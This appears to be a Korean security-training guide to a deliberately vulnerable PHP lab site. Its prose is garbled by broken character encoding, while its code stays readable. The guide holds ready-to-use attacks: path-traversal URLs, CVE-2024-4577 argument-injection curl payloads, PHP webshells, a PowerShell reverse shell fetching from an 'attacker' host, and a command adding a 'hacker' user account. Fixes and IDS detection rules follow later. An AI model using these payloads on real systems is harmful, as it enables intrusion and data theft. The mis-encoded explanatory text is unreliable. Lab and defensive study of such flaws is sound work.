# 1x INV ì›¹ì‚¬ì´íŠ¸ ì·¨ì•½ì  ê°€ì´ë“œ
## ë³´ì•ˆ êµìœ¡ ë° ì‹¤ìŠµìš© ë¬¸ì„œ

---

## âš ï¸ ì£¼ì˜ì‚¬í•­

ì´ ë¬¸ì„œëŠ” **ë³´ì•ˆ êµìœ¡ ë° ì‹¤ìŠµ ëª©ì **ìœ¼ë¡œë§Œ ì‚¬ìš©ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.
ì‹¤ì œ ìš´ì˜ í™˜ê²½ì—ì„œëŠ” ì´ëŸ¬í•œ ì·¨ì•½ì ë“¤ì´ ì¡´ì¬í•´ì„œëŠ” ì•ˆ ë©ë‹ˆë‹¤.

---

## ğŸ“ ì·¨ì•½ì  ìœ„ì¹˜ ë° ê³µê²© ë°©ë²•

### 1. **Path Traversal + LFI (Local File Inclusion)**

#### ì·¨ì•½í•œ íŒŒì¼
- `index.php` (lines 3-12)
- `company.php` (lines 2-7)
- `notice.php` (lines 2-7)
- `product.php` (lines 2-18)
- `support.php` (lines 2-22)

#### ì·¨ì•½ì  ì½”ë“œ íŒ¨í„´

```php
// ëª¨ë“  í˜ì´ì§€ì— ê³µí†µìœ¼ë¡œ ì¡´ì¬í•˜ëŠ” ì·¨ì•½ì 
$lang = isset($_GET['lang']) ? $_GET['lang'] : 'ko';
$page = isset($_GET['page']) ? $_GET['page'] : '';

if (!empty($page)) {
    $lang_file = "lang/{$lang}/{$page}";
    if (file_exists($lang_file)) {
        include($lang_file);  // ğŸ”´ ì·¨ì•½ì : ì…ë ¥ê°’ ê²€ì¦ ì—†ìŒ
    }
}
```

#### ê³µê²© ë²¡í„°

**ê³µê²© 1: ìƒìœ„ ë””ë ‰í† ë¦¬ ì ‘ê·¼**
```
http://localhost:8000/company.php?lang=../../&page=etc/passwd
http://localhost:8000/index.php?lang=../&page=../webmail/config/config.inc.php
```

**ê³µê²© 2: ë¯¼ê°í•œ íŒŒì¼ ì½ê¸°**
```
http://localhost:8000/support.php?page=../api/config.example.php
http://localhost:8000/product.php?page=../init-db.sql
```

**ê³µê²© 3: NULL Byte Injection (PHP < 5.3.4)**
```
http://localhost:8000/notice.php?page=../../../etc/passwd%00
```

---

### 2. **CVE-2024-4577: PHP-CGI Argument Injection**

#### ì „ì œ ì¡°ê±´
âš ï¸ **Windows + PHP-CGI ëª¨ë“œì—ì„œë§Œ ì‘ë™**
- Docker í™˜ê²½(mod_php)ì—ì„œëŠ” ì‘ë™í•˜ì§€ ì•ŠìŒ
- Windows Server 2019 + XAMPP í™˜ê²½ í•„ìš”

#### ì·¨ì•½í•œ íŒŒì¼
**ëª¨ë“  PHP íŒŒì¼** (PHP-CGI ëª¨ë“œì—ì„œ)
- `support.php` (ì¶”ê°€ ê³µê²© í‘œë©´: template íŒŒë¼ë¯¸í„°)
- `product.php` (ì¶”ê°€ ê³µê²© í‘œë©´: spec íŒŒë¼ë¯¸í„°)
- `index.php`, `company.php`, `notice.php`

#### ê³µê²© ë°©ë²•

**ê¸°ë³¸ Payload**
```bash
# Soft Hyphen (0xAD)ë¥¼ ì´ìš©í•œ ìš°íšŒ
support.php?lang=ko%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input

# POST Body:
<?php system('whoami'); ?>
```

**ê³ ê¸‰ Payload**
```bash
# 1. phpinfo() ì‹¤í–‰
curl -X POST "http://target/support.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php phpinfo(); ?>"

# 2. ì‹œìŠ¤í…œ ëª…ë ¹ ì‹¤í–‰
curl -X POST "http://target/product.php?spec=../index&lang=ko%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php system('dir C:\\'); ?>"

# 3. íŒŒì¼ ì½ê¸°
curl -X POST "http://target/support.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php echo file_get_contents('C:\\Windows\\System32\\drivers\\etc\\hosts'); ?>"

# 4. Reverse Shell
curl -X POST "http://target/company.php?lang=ko%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php exec('powershell -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://attacker/shell.ps1\')\"'); ?>"
```

---

### 3. **Unrestricted File Upload**

#### ì·¨ì•½í•œ íŒŒì¼
- `api/submit_inquiry.php` (lines 56-106)

#### ì·¨ì•½ì  ì½”ë“œ

```php
// íŒŒì¼ íƒ€ì… ê²€ì¦ ë¶€ì¬ (ì£¼ì„ìœ¼ë¡œë§Œ í‘œì‹œ)
// WARNING: Weak validation for security testing purposes only
$original_name = basename($file['name']);
$file_info = pathinfo($original_name);
$filename_base = $file_info['filename'];
$file_ext = isset($file_info['extension']) ? $file_info['extension'] : '';

// íŒŒì¼ëª… ê·¸ëŒ€ë¡œ ì €ì¥ (í™•ì¥ì ê²€ì¦ ì—†ìŒ)
move_uploaded_file($file['tmp_name'], $target_path);
```

#### ê³µê²© ë°©ë²•

**ê³µê²© 1: PHP ì›¹ì‰˜ ì—…ë¡œë“œ**
```bash
# 1. ì›¹ì‰˜ íŒŒì¼ ì¤€ë¹„ (shell.php)
<?php system($_GET['cmd']); ?>

# 2. ë¬¸ì˜ ì–‘ì‹ì„ í†µí•´ ì—…ë¡œë“œ
# URL: http://localhost:8000/inquiry-form.php
# íŒŒì¼ ì„ íƒ: shell.php
# ì—…ë¡œë“œ í›„ ì ‘ê·¼: http://localhost:8000/uploads/shell.php?cmd=whoami
```

**ê³µê²© 2: ì´ë¯¸ì§€ë¡œ ìœ„ì¥í•œ ì›¹ì‰˜**
```bash
# PHP ì½”ë“œë¥¼ PNG íŒŒì¼ì— ì‚½ì…
echo "<?php system(\$_GET['c']); ?>" > shell.php.png

# ì—…ë¡œë“œ í›„ LFI ì·¨ì•½ì ê³¼ ê²°í•©
http://localhost:8000/support.php?page=../uploads/shell.php.png&c=whoami
```

**ê³µê²© 3: Double Extension**
```bash
# íŒŒì¼ëª…: evil.php.jpg
# ì¼ë¶€ ì„œë²„ ì„¤ì •ì—ì„œëŠ” .phpë¡œ ì‹¤í–‰ë¨
```

---

### 4. **SQL Injection (Prepared Statement ë¯¸ì‚¬ìš© ì˜ì—­)**

#### ì·¨ì•½í•œ íŒŒì¼
- `api/get_inquiries.php` (ì ì¬ì )
- `api/get_inquiry_detail.php` (ì ì¬ì )

#### ì·¨ì•½ì  ë¶„ì„

ëŒ€ë¶€ë¶„ PDO Prepared Statement ì‚¬ìš©ìœ¼ë¡œ ì•ˆì „í•˜ì§€ë§Œ, ë‹¤ìŒ ì˜ì—­ ì£¼ì˜:

```php
// submit_inquiry.phpì—ì„œ ë¹„ë°€ë²ˆí˜¸ í‰ë¬¸ ì €ì¥
$password = $data['password'];  // ğŸ”´ ì·¨ì•½ì : í•´ì‹œ ì—†ì´ í‰ë¬¸ ì €ì¥
```

#### ê³µê²© ë°©ë²•

**Time-based Blind SQL Injection í…ŒìŠ¤íŠ¸**
```
http://localhost:8000/api/get_inquiry_detail.php?id=1' AND SLEEP(5)--
```

---

### 5. **Insecure Direct Object Reference (IDOR)**

#### ì·¨ì•½í•œ íŒŒì¼
- `api/get_inquiry_detail.php`
- `api/get_inquiries.php`

#### ì·¨ì•½ì 

ë¬¸ì˜ IDë§Œìœ¼ë¡œ ì ‘ê·¼ ê°€ëŠ¥, ì†Œìœ ê¶Œ ê²€ì¦ ë¶€ì¬:

```php
// ì·¨ì•½í•œ ë¡œì§ (ì¶”ì •)
$id = $_GET['id'];
SELECT * FROM inquiries WHERE id = :id  // ğŸ”´ ì‚¬ìš©ì ê²€ì¦ ì—†ìŒ
```

#### ê³µê²© ë°©ë²•

```bash
# ë‹¤ë¥¸ ì‚¬ìš©ìì˜ ë¬¸ì˜ ë‚´ì—­ ì¡°íšŒ
http://localhost:8000/api/get_inquiry_detail.php?id=1
http://localhost:8000/api/get_inquiry_detail.php?id=2
http://localhost:8000/api/get_inquiry_detail.php?id=3
...
```

---

### 6. **Sensitive Information Disclosure**

#### ë…¸ì¶œëœ íŒŒì¼ë“¤

```
http://localhost:8000/.htaccess (ì„œë²„ ì„¤ì • ì •ë³´)
http://localhost:8000/docker-compose.yml (DB ì¸ì¦ì •ë³´)
http://localhost:8000/init-db.sql (DB êµ¬ì¡°)
http://localhost:8000/api/config.example.php (ì„¤ì • ì˜ˆì œ)
```

#### ê³µê²© ë°©ë²•

```bash
# 1. Database ì¸ì¦ì •ë³´ íšë“
curl http://localhost:8000/docker-compose.yml

# 2. DB êµ¬ì¡° ë¶„ì„
curl http://localhost:8000/init-db.sql

# 3. ì„¤ì • íŒŒì¼ ìœ ì¶”
curl http://localhost:8000/api/config.php
```

---

### 7. **Password Storage Vulnerability**

#### ì·¨ì•½í•œ íŒŒì¼
- `api/submit_inquiry.php` (line 129)

#### ì·¨ì•½ì  ì½”ë“œ

```php
// WARNING: Plain text password storage for vulnerability testing
// In production, use password_hash()
$password = $data['password'];  // ğŸ”´ í‰ë¬¸ ì €ì¥
```

#### ê³µê²© ì‹œë‚˜ë¦¬ì˜¤

1. SQL Injectionìœ¼ë¡œ DB ì ‘ê·¼
2. ë¹„ë°€ë²ˆí˜¸ í‰ë¬¸ìœ¼ë¡œ íšë“
3. ë¹„ê³µê°œ ë¬¸ì˜ ë¬´ë‹¨ ì—´ëŒ

---

## ğŸ¯ ì‹¤ìŠµ ì‹œë‚˜ë¦¬ì˜¤

### ì‹œë‚˜ë¦¬ì˜¤ 1: ê¸°ë³¸ ì •ë³´ ìˆ˜ì§‘

```bash
# 1. ë””ë ‰í† ë¦¬ êµ¬ì¡° íŒŒì•…
http://localhost:8000/

# 2. ì„¤ì • íŒŒì¼ íƒˆì·¨
http://localhost:8000/company.php?page=../docker-compose.yml

# 3. DB ì •ë³´ íšë“
http://localhost:8000/support.php?page=../init-db.sql

# 4. API ì„¤ì • í™•ì¸
http://localhost:8000/product.php?page=../api/config.example.php
```

### ì‹œë‚˜ë¦¬ì˜¤ 2: ì›¹ì‰˜ ì—…ë¡œë“œ ë° ì‹¤í–‰

```bash
# 1. ì›¹ì‰˜ íŒŒì¼ ì¤€ë¹„
echo '<?php system($_GET["c"]); ?>' > backdoor.php

# 2. ë¬¸ì˜í•˜ê¸° ì–‘ì‹ìœ¼ë¡œ ì—…ë¡œë“œ
# http://localhost:8000/inquiry-form.php
# íŒŒì¼: backdoor.php

# 3. LFIë¡œ ì‹¤í–‰
http://localhost:8000/support.php?template=../uploads/backdoor&c=whoami

# 4. ê¶Œí•œ ìƒìŠ¹
http://localhost:8000/support.php?template=../uploads/backdoor&c=net user hacker P@ss123! /add
```

### ì‹œë‚˜ë¦¬ì˜¤ 3: CVE-2024-4577 ê³µê²© (Windows í™˜ê²½)

```bash
# 1. ì·¨ì•½ì  í™•ì¸
curl -X POST "http://target/support.php?lang=ko%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php phpinfo(); ?>"

# 2. ì‹œìŠ¤í…œ ì •ë³´ ìˆ˜ì§‘
curl -X POST "http://target/product.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php system('systeminfo'); ?>"

# 3. ê³„ì • ì •ë³´ íƒˆì·¨
curl -X POST "http://target/company.php?lang=ko%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php system('net user'); ?>"

# 4. Persistent ì›¹ì‰˜ ì„¤ì¹˜
curl -X POST "http://target/support.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php file_put_contents('C:\\xampp\\htdocs\\shell.php', '<?php eval(\$_POST[x]); ?>'); ?>"
```

### ì‹œë‚˜ë¦¬ì˜¤ 4: ë°ì´í„°ë² ì´ìŠ¤ ê³µê²©

```bash
# 1. DB ì¸ì¦ì •ë³´ íšë“ (docker-compose.yml)
http://localhost:8000/notice.php?page=../docker-compose.yml

# ì¶œë ¥:
# MYSQL_USER: admin
# MYSQL_PASSWORD: password
# MYSQL_DATABASE: ota_db

# 2. ì™¸ë¶€ì—ì„œ DB ì ‘ì† (í¬íŠ¸ 3307 ë…¸ì¶œ)
mysql -h localhost -P 3307 -u admin -ppassword ota_db

# 3. ë°ì´í„° íƒˆì·¨
SELECT * FROM inquiries;
SELECT * FROM users;  # ì¡´ì¬í•œë‹¤ë©´

# 4. ì•…ì„± ë°ì´í„° ì‚½ì…
INSERT INTO inquiries (message) VALUES ('<?php system($_GET[c]); ?>');
```

---

## ğŸ›¡ï¸ ì·¨ì•½ì  ìˆ˜ì • ë°©ë²•

### 1. Path Traversal ë°©ì–´

```php
// ìˆ˜ì • ì „ (ì·¨ì•½)
$lang_file = "lang/{$lang}/{$page}";
if (file_exists($lang_file)) {
    include($lang_file);
}

// ìˆ˜ì • í›„ (ì•ˆì „)
$allowed_langs = ['ko', 'en'];
$allowed_pages = ['common.php', 'about.php'];

if (in_array($lang, $allowed_langs) && in_array($page, $allowed_pages)) {
    $lang_file = "lang/{$lang}/{$page}";
    if (file_exists($lang_file)) {
        include($lang_file);
    }
}

// ë˜ëŠ” basename() ì‚¬ìš©
$safe_page = basename($page);
$lang_file = "lang/{$lang}/{$safe_page}";
```

### 2. CVE-2024-4577 ë°©ì–´

```bash
# PHP ë²„ì „ ì—…ê·¸ë ˆì´ë“œ
PHP 8.3.8+
PHP 8.2.20+
PHP 8.1.29+

# ë˜ëŠ” mod_php ì‚¬ìš© (CGI ëŒ€ì‹ )
# Apache ì„¤ì •
LoadModule php_module modules/libphp.so
<FilesMatch \.php$>
    SetHandler application/x-httpd-php
</FilesMatch>

# WAF ê·œì¹™ ì¶”ê°€
RewriteCond %{QUERY_STRING} %AD [NC]
RewriteRule .* - [F,L]
```

### 3. File Upload ë³´ì•ˆ

```php
// í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ë°©ì‹
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];

$file_ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $file['tmp_name']);

if (!in_array($file_ext, $allowed_extensions) || !in_array($mime, $allowed_mimes)) {
    throw new Exception('Invalid file type');
}

// íŒŒì¼ëª… ì™„ì „íˆ ë³€ê²½
$new_filename = bin2hex(random_bytes(16)) . '.' . $file_ext;
$target_path = $upload_dir . $new_filename;

// ì‹¤í–‰ ê¶Œí•œ ì œê±°
chmod($target_path, 0644);
```

### 4. ë¹„ë°€ë²ˆí˜¸ í•´ì‹œ

```php
// ìˆ˜ì • ì „ (ì·¨ì•½)
$password = $data['password'];

// ìˆ˜ì • í›„ (ì•ˆì „)
$password = password_hash($data['password'], PASSWORD_ARGON2ID);

// ê²€ì¦
if (password_verify($input_password, $stored_hash)) {
    // ì¸ì¦ ì„±ê³µ
}
```

### 5. IDOR ë°©ì–´

```php
// ì„¸ì…˜ ì‚¬ìš©ì í™•ì¸
session_start();
if (!isset($_SESSION['user_id'])) {
    die('Unauthorized');
}

// ì†Œìœ ê¶Œ ê²€ì¦
$stmt = $pdo->prepare("SELECT * FROM inquiries WHERE id = :id AND user_id = :user_id");
$stmt->execute([
    ':id' => $id,
    ':user_id' => $_SESSION['user_id']
]);
```

---

## ğŸ“Š ì·¨ì•½ì  ìš”ì•½í‘œ

| ì·¨ì•½ì  | ìœ„ì¹˜ | CVSS | ë‚œì´ë„ | ì˜í–¥ |
|--------|------|------|--------|------|
| Path Traversal/LFI | ëª¨ë“  PHP íŒŒì¼ | 8.6 | ë‚®ìŒ | ì •ë³´ ë…¸ì¶œ, RCE |
| CVE-2024-4577 | ëª¨ë“  PHP (CGI) | 9.8 | ì¤‘ê°„ | RCE |
| Unrestricted Upload | submit_inquiry.php | 8.8 | ë‚®ìŒ | RCE, ì›¹ì‰˜ |
| Plain Text Password | submit_inquiry.php | 7.5 | ë‚®ìŒ | ì •ë³´ ë…¸ì¶œ |
| IDOR | API íŒŒì¼ë“¤ | 6.5 | ë‚®ìŒ | ì •ë³´ ë…¸ì¶œ |
| Information Disclosure | ì„¤ì • íŒŒì¼ë“¤ | 7.5 | ë§¤ìš° ë‚®ìŒ | ì¸ì¦ì •ë³´ ë…¸ì¶œ |

---

## ğŸ” íƒì§€ ë°©ë²•

### 1. WAF/IDS ì‹œê·¸ë‹ˆì²˜

```
# Path Traversal
alert tcp any any -> any 80 (msg:"Path Traversal Attempt"; content:"../"; http_uri; sid:1000001;)

# CVE-2024-4577
alert tcp any any -> any 80 (msg:"CVE-2024-4577 Attempt"; content:"%AD"; http_uri; sid:1000002;)

# Webshell Upload
alert tcp any any -> any 80 (msg:"PHP Webshell Upload"; content:"<?php"; http_client_body; sid:1000003;)
```

### 2. ë¡œê·¸ ë¶„ì„

```bash
# Apache Access Log
grep -E "\.\./|%2e%2e|%252e" /var/log/apache2/access.log
grep -E "%AD|auto_prepend_file|allow_url_include" /var/log/apache2/access.log
grep -E "\.php\.(jpg|png|gif)" /var/log/apache2/access.log
```

---

## ğŸ“š í•™ìŠµ ëª©í‘œ

- [ ] Path Traversal ê³µê²© ì´í•´ ë° ì‹¤ìŠµ
- [ ] LFI â†’ RCE ë³€í™˜ ê³¼ì • ì´í•´
- [ ] CVE-2024-4577 ì›ë¦¬ ë° ì‹¤ìŠµ
- [ ] File Upload ìš°íšŒ ê¸°ë²•
- [ ] IDOR ì·¨ì•½ì  ë°œê²¬ ë° í™œìš©
- [ ] ì·¨ì•½ì  ì¡°í•© ê³µê²© (LFI + File Upload)
- [ ] ë°©ì–´ ê¸°ë²• êµ¬í˜„

---

## âš–ï¸ ë²•ì  ê³ ì§€

ì´ ë¬¸ì„œì™€ ì·¨ì•½ì ì€ **êµìœ¡ ëª©ì ìœ¼ë¡œë§Œ** ì œì‘ë˜ì—ˆìŠµë‹ˆë‹¤.
- í—ˆê°€ë°›ì§€ ì•Šì€ ì‹œìŠ¤í…œì— ëŒ€í•œ ê³µê²©ì€ ë¶ˆë²•ì…ë‹ˆë‹¤
- ë°˜ë“œì‹œ ê²©ë¦¬ëœ í…ŒìŠ¤íŠ¸ í™˜ê²½ì—ì„œë§Œ ì‹¤ìŠµí•˜ì„¸ìš”
- ì‹¤ì œ ì„œë¹„ìŠ¤ì—ëŠ” ëª¨ë“  ì·¨ì•½ì ì„ ìˆ˜ì •í•´ì•¼ í•©ë‹ˆë‹¤

---

**ë³´ì•ˆ ì—°êµ¬ ë° êµìœ¡ ë¬¸ì˜**: security-training@1xinv.com
